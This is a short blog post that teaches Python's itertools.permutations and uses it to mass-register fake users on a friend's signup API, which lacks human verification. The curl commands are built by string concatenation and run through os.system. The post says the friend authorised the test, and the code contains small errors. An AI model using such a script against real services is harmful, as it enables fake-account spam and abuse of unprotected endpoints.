---
layout: post
title: "Generate alphabet permutation in python"
date: 2014-08-12 22:38:04 +0800
comments: true
categories: [Python,Bash]
---

Yesterday I've find a loophole in my friends website, the API for mobile side registration does not have any human verification functions. 
I decide to generate alphabet permutation list for user name and register fake users.

In python standard library have functions for iterators for efficient looping which name is itertools. The itertools have permutation generators.

The permutation function needs two arguments, one is iterable, another one is length like if the iterable is "ABC" and length is 2 then (A,B) (A,C) (B,A) (B,C) (C,A) (C,B) are results for this functions. 
``` python Generate permutation https://docs.python.org/2/library/itertools.html#itertools.permutations
import itertools
iterable = 'ABC'
length = 2
permutation = itertools.permutations(iterable, length)
permutation = list(permuation)
```

After generate, inside the python list are tuples not string for user name. We need join alphabet within tuple together. Like (A,B) become 'AB'

``` python
nameList = []                        #Create a empty list
for i in permutation:
    nameList.append(''.join(i))      #Join alphabet together and append in namList
```
The user name list are done, next is register user by use API. That API for registration use form-urlencoded. For simplicity, I decide just use curl construct special POST request.

``` python
TYPE = "'Content-Type:application/x-www-form-urlencoded'"
DEVICE = " -d 'device_type=2&user_name="
EMAIL = "&email="
EMAILTAIL = "%40bujiang.info&password=12345&device_token='"
URL = " http://***********.com/*******api/index.php/v1/dp_auth/signup"
COMMAND = "curl -s -X POST -H "

def execmd():
    if nameList:
        name = nameList.pop()    #Poped name use for username
        cmd = COMMAND + TYPE + DEVICE + name + EMAIL + name + EMAILTAIL + URL    #Construct command for different username registration
        os.system(cmd)    #Execute command in shell 
```

The code is modified from original code, original code use multithread for concurrent post request. Those asterisk in code URL for privacy reason.
Another loophole for this registration API is password in plaintext.

*: All test actions are under my friend authorization 
